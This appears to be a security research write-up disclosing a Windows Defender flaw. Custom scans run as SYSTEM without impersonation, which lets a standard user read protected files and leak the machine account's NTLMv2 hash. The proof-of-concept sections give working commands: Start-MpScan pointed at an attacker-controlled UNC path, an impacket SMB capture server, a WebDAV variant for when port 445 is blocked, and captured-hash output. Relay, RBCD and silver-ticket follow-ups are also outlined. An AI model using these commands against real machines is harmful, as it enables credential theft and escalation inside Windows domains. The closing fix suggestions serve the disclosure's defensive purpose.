---
description: Abusing Windows Defender to Leak Machine Credentials
icon: windows
cover: ../.gitbook/assets/Microsoft Defender Credential Leak Research (1).png
coverY: 238.01351351351354
coverHeight: 391
---

# Scan2Hash In Microsoft

### The One-Line Summary

A standard user literally any unprivileged account can fire one PowerShell command and force Windows Defender to send the **machine's NTLMv2 hash** to an attacker-controlled server. No UAC bypass needed. No admin. No fancy tricks. Just a built-in cmdlet that every Windows user has access to by default.

***

### Background What Even Is Windows Defender Doing Here?

Before jumping into the vuln, let's understand the setup.

Windows Defender runs as `NT AUTHORITY\SYSTEM`. That's the highest privilege level on a Windows machine above admin, above everything. It needs SYSTEM because it has to scan files that regular users can't even look at. Makes sense for an AV, right?

Now, Windows exposes a feature called **Custom Scan** you can tell Defender "hey, scan this specific file or folder." This is accessible to standard users through the `Start-MpScan` cmdlet:

```powershell
Start-MpScan -ScanType CustomScan -ScanPath "C:\some\path\file.exe"
```

Normal use case? You downloaded something sketchy, you want to quickly check it. Totally legitimate.

The problem? When Defender goes to open that file for scanning, it **doesn't switch to your user context**. It stays as SYSTEM. And that creates two separate but related problems.

***

### The Vulnerable Component

<figure><img src="../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

The RPC handler inside `MpSvc.dll` receives your scan request, then calls `CreateFileW()` to open the target file. The issue is it never calls `ImpersonateClient()` or any equivalent before doing this.

**What should happen:**

<figure><img src="../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

**What actually happens:**

<figure><img src="../.gitbook/assets/Screenshot 2026-11-20 013858.png" alt=""><figcaption></figcaption></figure>

That's it. That's the whole bug. Missing one function call.

#### The Impersonation Gap Numbers Don't Lie

Static analysis of `MpSvc.dll` (Platform 4.18.26060.3008-0):

| Category                                                       | Count |
| -------------------------------------------------------------- | ----- |
| Functions reaching `CreateFileW` **without** impersonation     | \~80  |
| Functions reaching `CreateFileW` **with** proper impersonation | 1     |

**80:1 ratio.** One function got it right. Eighty didn't.

***

### Two Bugs, One Root Cause

This missing impersonation causes **two distinct security issues**:

#### Bug #1 - ACL Bypass (Read Arbitrary Files)

Since Defender opens files as SYSTEM, it can read files that your user account has **zero access to**.

Think about it if you create a file and lock it down so only SYSTEM can read it, a regular user hitting `Get-Content` on that file gets "Access Denied." But if that same user asks Defender to scan it? Defender opens it just fine as SYSTEM and reads every byte.

This violates a fundamental security principle: **a tool should not grant more access than the caller has.**

#### Bug #2 - NTLM Coercion (Machine Account Hash Leak)

This is the spicy one.

You can pass a **UNC path** (network path) to `Start-MpScan`. Something like:

```powershell
Start-MpScan -ScanType CustomScan -ScanPath "\\192.168.1.1\share\file.exe"
```

When Defender tries to open `\\192.168.1.1\share\file.exe` as SYSTEM, Windows needs to authenticate to the remote server. It does this using **NTLM** and it authenticates using the **machine account credentials** (`MACHINE$`).

So from a standard user's perspective:

* You type one command
* Defender (running as SYSTEM) connects to your attacker server
* Windows sends `MACHINE$::DOMAIN:NTLMv2_hash` to your server
* You captured the machine account hash

***

### Kill Chain

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER SETUP                           │
│                                                             │
│   Linux Box:                                                │
│   $ impacket-smbserver test /tmp/share -smb2support         │
│   [*] Listening on 0.0.0.0:445                              │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ (attacker waits)
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                    VICTIM MACHINE                            │
│                                                             │
│   Standard User (no admin) runs:                            │
│   PS> Start-MpScan -ScanType CustomScan \                   │
│           -ScanPath "\\ATTACKER_IP\share\file.exe"          │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ RPC call to MsMpEng
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                 MsMpEng.exe (NT AUTHORITY\SYSTEM)            │
│                                                             │
│   MpSvc.dll → RPC Handler receives request                  │
│   ✗ No ImpersonateClient() called                           │
│   → CreateFileW("\\ATTACKER_IP\share\file.exe", SYSTEM)     │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ Windows SMB stack kicks in
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                  LSASS / SMB Client                          │
│                                                             │
│   "Need to authenticate to \\ATTACKER_IP"                   │
│   Context = SYSTEM = Machine Account                        │
│   → Sends NTLMv2 auth using MACHINE$ credentials            │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ TCP SYN to ATTACKER:445
                      │ from PID 4 (System kernel)
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                  ATTACKER (impacket)                         │
│                                                             │
│  [*] AUTHENTICATE_MESSAGE (DOMAIN\MACHINE$, VICTIM)         │
│  [*] NTLMv2-SSP Hash:                                       │
│      MACHINE$::DOMAIN:<challenge>:<hash>                    │
│                                                             │
│  → Hash captured. Game on.                                  │
└─────────────────────────────────────────────────────────────┘
```

***

### The Broken Fix Microsoft Already Tried (and Failed)

Here's where it gets interesting.

Microsoft actually knew about this or at least had a mitigation in mind. There's a feature flag in `MpSvc.dll` called:

```
MpFC_EnableImpersonationOnNetworkResourceScan
```

You can check it here:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features\EcsConfigs" /v MpFC_EnableImpersonationOnNetworkResourceScan
```

On a **stock Windows 11 install** no manual changes, right out of the box this returns `0x1` (enabled). Microsoft pushed it via their **ECS (Experimentation and Configuration Service)** their cloud-based feature rollout mechanism.

Translation: Microsoft knew this was a problem, wrote a flag for it, and deployed it to all Windows 11 machines silently via the cloud.

**But it doesn't work.**

The vulnerability fully reproduces with the flag set to `1`. Both the ACL bypass and the NTLM coercion still trigger. Either:

* The code that checks this flag has a logic bug (checks the wrong condition, inverted logic, something like that), **or**
* The flag exists but the actual impersonation code was never written the flag gates a dead/unimplemented code path

This was **last verified on 2026-07-09** with `MpFC_EnableImpersonationOnNetworkResourceScan = 1`. EICAR still detected through SYSTEM-only ACL. NTLM coercion still triggers. Flag is decorative.

***

### Proof of Concept

#### Part 1 - ACL Bypass (Prove SYSTEM Context)

The goal: create a file that the standard user **cannot read**, but Defender can. If Defender detects it, that proves it ran as SYSTEM.

<figure><img src="../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

```powershell
# Step 1: Create EICAR test file
$testFile = "$env:USERPROFILE\defender_acl_test\system_only_eicar.com"
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

New-Item -ItemType Directory -Path "$env:USERPROFILE\defender_acl_test" -Force | Out-Null
Set-Content -Path $testFile -Value $eicar -Encoding ascii -Force

# Step 2: Lock it down — SYSTEM only, no other ACEs
$newAcl = New-Object System.Security.AccessControl.FileSecurity
$newAcl.SetAccessRuleProtection($true, $false)   # disable inheritance
$newAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "NT AUTHORITY\SYSTEM", "FullControl", "Allow")))
Set-Acl -Path $testFile -AclObject $newAcl

# Step 3: Verify user can't read it
Get-Content $testFile   # Expected: Access Denied

# Step 4: Ask Defender to scan it
Start-MpScan -ScanType CustomScan -ScanPath $testFile

# Step 5: Check if Defender detected EICAR (it will)
Start-Sleep -Seconds 3
Get-MpThreatDetection | Where-Object { $_.Resources -match "system_only_eicar" }
```

**Expected output:**

```
Get-Content: Access to the path '...\system_only_eicar.com' is denied.

ThreatID           : 2147519003
ActionSuccess      : True
InitialDetectionTime : 07/09/2026 16:24:32
Resources          : file:_C:\Users\user\defender_acl_test\system_only_eicar.com
```

User can't read it. Defender can. SYSTEM confirmed.

***

#### Part 2 - NTLM Coercion (Capture Machine Hash)

**Attacker machine (Linux):**

```bash
# Start SMB listener — this will capture the hash
impacket-smbserver test /tmp/share -smb2support
```

**Victim machine (standard user):**

```powershell
# One command. That's it.
Start-MpScan -ScanType CustomScan -ScanPath "\\ATTACKER_IP\share\file.exe"
```

**Monitor outgoing connection (optional, for verification):**

```powershell
# In a separate terminal while scan runs
while ($true) {
    netstat -ano | Select-String "ATTACKER_IP:445"
    Start-Sleep -Milliseconds 200
}
```

**What you see on victim netstat:**

```
23:07:10.603 | TCP  192.168.1.111:7132  192.168.1.1:445  SYN_SENT  PID:4
23:07:10.812 | TCP  192.168.1.111:7132  192.168.1.1:445  SYN_SENT  PID:4
```

PID 4 = System kernel process. Not the user. SYSTEM is reaching out.

**What you see on attacker impacket:**

```
[*] Incoming connection (192.168.1.111, 7132)
[*] AUTHENTICATE_MESSAGE (OVERWATCH\MACHINE$, VICTIM-PC)
[*] NTLMv2-SSP Hash: MACHINE$::OVERWATCH:aaaaaaaaaaaaaaaa:hash_here:...
```

Done. Machine account hash captured from a **standard user** with **one command**.

***

#### WebDAV Option (Port 445 Blocked?)

If outbound port 445 is blocked, you can use WebDAV on any port:

**Attacker (Windows, run `capture.py`):**

```bash
python capture.py 8888
```

**Victim:**

```powershell
# WebClient service needs to be running
Start-Service WebClient

Start-MpScan -ScanType CustomScan -ScanPath "\\ATTACKER_IP@8888\DavWWWRoot\file.exe"
```

This uses HTTP/WebDAV on port 8888 instead of SMB on 445. Same NTLM auth flow, different port. Useful for environments where 445 outbound is blocked but arbitrary HTTP is allowed.

***

### What Can You Do With the Machine Hash?

On a standalone machine, the hash has limited direct use (you'd need to crack it). But on a **domain-joined machine** which is basically every enterprise Windows box the machine account hash opens several attack paths:

#### NTLM Relay

Don't even crack it. Relay it in real-time.

```
Victim triggers scan → machine hash sent to attacker
Attacker relays hash to domain controller (LDAP/SMB)
→ Authenticate as MACHINE$ to DC
→ Depending on configuration, can read AD objects, modify delegation, etc.
```

#### RBCD (Resource-Based Constrained Delegation)

```
Attacker has machine account hash
→ Authenticate to DC as MACHINE$
→ Modify msDS-AllowedToActOnBehalfOfOtherIdentity on target machine
→ Request service tickets impersonating any user (including domain admin)
→ Full compromise of target machine
```

#### Silver Ticket

```
Machine hash → derive session key
→ Forge Kerberos service tickets for any service on that machine
→ Authenticate to SMB, HTTP, MSSQL etc. as any user
→ No DC contact needed, offline attack
```

#### Impact Table

| Attack               | Requires        | Impact                     |
| -------------------- | --------------- | -------------------------- |
| NTLM Relay (SMB)     | Outbound 445    | Lateral movement           |
| NTLM Relay (LDAP)    | Outbound 389    | AD modification            |
| RBCD Escalation      | DC write access | Domain machine takeover    |
| Silver Ticket        | Offline         | Service impersonation      |
| Hash crack (offline) | GPU time        | Plaintext machine password |

***

### The Call Stack

For anyone who wants to trace this in a debugger or do static analysis themselves:

**ACL Bypass path:**

**NTLM Coercion path:**

```
MsMpEng.exe
  └── MpSvc.dll!<RPC_handler>
          └── CreateFileW(\\ATTACKER\share\file.exe, SYSTEM token)
                  └── SMB stack: need to auth to \\ATTACKER
                  └── LSASS: NTLM auth using MACHINE$ creds
                  └── NTLMv2 hash sent to attacker
                  └── PID 4 → TCP SYN_SENT to ATTACKER:445
```

**Impersonation gap:**

```
~80 functions in MpSvc.dll:
  └── reach CreateFileW / sensitive sinks
  └── NO ImpersonateClient() call before open
  └── Status: NOGUARD (vulnerable)

1 function in MpSvc.dll:
  └── reach CreateFileW
  └── WITH proper impersonation guard
  └── Status: GUARDED (correct)
```

***

### Suggested Fix

The correct fix is straightforward this is literally what `ImpersonateNamedPipeClient` / `ImpersonateClient` exists for:

**Fix 1 (Proper fix):** Before opening any file in on-demand scan code paths, impersonate the calling user's token. After the open, revert. All 80 vulnerable functions need this.

```cpp
// Pseudocode — what should be happening
HANDLE hFile = INVALID_HANDLE_VALUE;
if (ImpersonateClient(rpcContext) == S_OK) {
    hFile = CreateFileW(scanPath, ...);
    RevertToSelf();
}
```

**Fix 2 (Defense-in-depth):** At the RPC handler level, check if the requested scan path is a UNC path. If yes, and the caller is not an admin, reject the request outright.

**Fix 3 (Actually fix the broken flag):** The flag `MpFC_EnableImpersonationOnNetworkResourceScan` already exists and is deployed. Microsoft needs to actually wire it to working impersonation code right now it gates a dead code path.

***

### Environment

* **OS:** Windows 11 24H2 (Build 26200)
* **Defender Platform:** 4.18.26060.3008-0
* **User Context:** Standard user account (no admin, no extra privileges)
* **Feature Flag:** `MpFC_EnableImpersonationOnNetworkResourceScan = 0x1` (deployed but broken)

***

### References

* `MsMpEng.exe` - Windows Defender main service process
* `MpSvc.dll` - Defender service DLL, handles RPC-based scan requests
* `Start-MpScan` - built-in PowerShell cmdlet, available to all users
* `ImpersonateClient` - Win32 API for token impersonation in RPC servers
* `ECS (Experimentation and Configuration Service)` - Microsoft's cloud config push system
* NTLM Relay -  attack technique using captured NTLM hashes without cracking
* RBCD - Resource-Based Constrained Delegation, Kerberos delegation abuse

***

<figure><img src="../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>
